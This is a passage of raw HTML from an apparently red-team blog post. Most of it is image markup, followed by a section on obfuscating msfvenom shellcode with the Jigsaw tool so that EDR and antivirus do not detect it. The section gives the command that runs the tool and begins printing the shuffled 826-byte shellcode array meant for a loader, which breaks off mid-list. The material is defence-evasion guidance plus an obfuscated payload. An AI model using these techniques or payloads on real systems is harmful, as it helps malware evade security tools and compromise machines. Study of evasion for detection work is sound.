https://miro.medium.com/v2/resize:fit:786/format:webp/1*ppIYR9VEuxfZ2dntO11f3A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*ppIYR9VEuxfZ2dntO11f3A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ppIYR9VEuxfZ2dntO11f3A.png 1100w, https://miro.medium.com/v2/resize:fit:1098/format:webp/1*ppIYR9VEuxfZ2dntO11f3A.png 1098w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 549px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*ppIYR9VEuxfZ2dntO11f3A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ppIYR9VEuxfZ2dntO11f3A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ppIYR9VEuxfZ2dntO11f3A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ppIYR9VEuxfZ2dntO11f3A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ppIYR9VEuxfZ2dntO11f3A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ppIYR9VEuxfZ2dntO11f3A.png 1100w, https://miro.medium.com/v2/resize:fit:1098/1*ppIYR9VEuxfZ2dntO11f3A.png 1098w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 549px"><img alt="" class="bi mn pz c" width="549" height="803" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:549/1*ppIYR9VEuxfZ2dntO11f3A.png"></picture></div></figure><figure class="pd pe pf pg ph pu pr ps paragraph-image"><div class="pr ps qy"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*N4V6tHuUEIAJ_sQSEWHGMA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*N4V6tHuUEIAJ_sQSEWHGMA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*N4V6tHuUEIAJ_sQSEWHGMA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*N4V6tHuUEIAJ_sQSEWHGMA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*N4V6tHuUEIAJ_sQSEWHGMA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*N4V6tHuUEIAJ_sQSEWHGMA.png 1100w, https://miro.medium.com/v2/resize:fit:1108/format:webp/1*N4V6tHuUEIAJ_sQSEWHGMA.png 1108w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 554px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*N4V6tHuUEIAJ_sQSEWHGMA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*N4V6tHuUEIAJ_sQSEWHGMA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*N4V6tHuUEIAJ_sQSEWHGMA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*N4V6tHuUEIAJ_sQSEWHGMA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*N4V6tHuUEIAJ_sQSEWHGMA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*N4V6tHuUEIAJ_sQSEWHGMA.png 1100w, https://miro.medium.com/v2/resize:fit:1108/1*N4V6tHuUEIAJ_sQSEWHGMA.png 1108w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 554px"><img alt="" class="bi mn pz c" width="554" height="728" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:554/1*N4V6tHuUEIAJ_sQSEWHGMA.png"></picture></div></figure><h2 id="12da" class="oc od hl bg oe of og il oh oi oj io ok ol om on oo op oq or os ot ou ov ow ox bl" data-selectable-paragraph="">Obfuscating Msfvenom Shellcode</h2><p id="902b" class="pw-post-body-paragraph ng nh hl ni b ij oy nk nl im oz nn no np pa nr ns nt pb nv nw nx pc nz oa ob he bl" data-selectable-paragraph="">Jigsaw takes a raw shellcode input and outputs randomized shellcode, a lookup table, and a C/C++ stub to translate the randomized shellcode back to a usable format. The reason to do this is so the entropy level (which could trigger EDR/AV) is not significantly increased like it would be with encryption and also the payload isn't significantly large as it would be if words were substituted for the shellcode instead.</p><div class="qa qb qc qd qe qf"><a href="https://github.com/RedSiege/Jigsaw?source=post_page-----bb589148e56f---------------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qg ac cb"><div class="qh ac cv ci cd qi"><h2 class="bg hm qj ab ga qk ql qm qn qo qp hk bl">GitHub - RedSiege/Jigsaw: Hide shellcode by shuffling bytes into a random array and reconstruct at…</h2><div class="qz m"><h3 class="bg b qj ab ga qk ql qm qn qo qp eb">Hide shellcode by shuffling bytes into a random array and reconstruct at runtime - RedSiege/Jigsaw</h3></div><div class="qq m"><p class="bg b ec ab ga qk ql qm qn qo qp eb">github.com</p></div></div><div class="qr m"><div class="ww m qt qu qv qr qw mn qf"></div></div></div></a></div><p id="7338" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">The creator even states “At some point, the deobfuscated shellcode will exist in memory and could be detected there. The methods used to load and execute the shellcode would also present opportunities for detection. ” EDR solutions often have a better chance than AV due to their focus on behavioral analysis and memory monitoring. Download the python script and execute it with our generated msfvenom shellcode to get jiggsaw.txt.</p><pre class="pd pe pf pg ph pi pj pk bq pl bc bl"><span id="798b" class="pm od hl pj b bh pn po m pp pq" data-selectable-paragraph="">python3 jigsaw.py msf.<span class="hljs-built_in">bin</span></span></pre><p id="acab" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Then we see the output in the jiggsaw.txt file which reconstructs the shellcode and we will put in our loader project on Visual Studio later:</p><pre class="pd pe pf pg ph pi pj pk bq pl bc bl"><span id="1769" class="pm od hl pj b bh pn po m pp pq" data-selectable-paragraph=""><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> jigsaw[<span class="hljs-number">826</span>] = { <span class="hljs-number">0x36</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x72</span>, 